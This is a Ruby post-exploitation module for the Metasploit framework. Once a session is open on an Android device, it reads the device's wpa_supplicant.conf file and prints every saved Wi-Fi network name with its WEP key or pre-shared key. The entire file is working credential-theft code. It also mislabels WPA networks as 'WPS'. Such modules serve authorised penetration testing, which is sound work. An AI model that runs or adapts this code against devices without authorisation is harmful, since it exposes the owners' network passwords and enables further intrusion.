##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  Rank = NormalRanking

  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Android::System

  def initialize(info={})
    super( update_info( info, {
        'Name'          => "Displays wireless SSIDs and PSKs",
        'Description'   => %q{
            This module displays all wireless AP creds saved on the target device.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [
            'Auxilus'
        ],
        'SessionTypes'  => [ 'meterpreter', 'shell' ],
        'Platform'       => 'android',
      }
    ))
  end

  def run
    data = read_file("/data/misc/wifi/wpa_supplicant.conf")
    parsed = data.split("network=")
    aps ||= []
    parsed.each do |block|
      next if block.split("ssid")[1].nil?
      ssid = block.split("ssid")[1].split("=")[1].split("\n").first.gsub(/"/, '')
      if search_token(block, "wep_key0")
        net_type = "WEP"
      elsif search_token(block, "psk")
        net_type = "WPS"
      else
        net_type = "OPEN"
      end
      case net_type
        when "WEP"
          pwd = get_password(block, "wep_key0")
        when "WPS"
          pwd = get_password(block, "psk")
        else
          pwd = ''
      end
      aps << [ssid, net_type, pwd]
    end

    ap_tbl = Rex::Text::Table.new(
      'Header'  => 'Wireless APs',
      'Indent'  => 1,
      'Columns' => ['SSID','net_type', 'password']
    )

    aps.each do |ap|
      ap_tbl << [
        ap[0],
        ap[1],
        ap[2]
      ]
    end

    print_line(ap_tbl.to_s)
  end

  def search_token(block, token)
    if block.to_s.include?(token)
      return true
    else
      return false
    end
  end

  def get_password(block, token)
    return block.split(token)[1].split("=")[1].split("\n").first.gsub(/"/, '')
  end
end
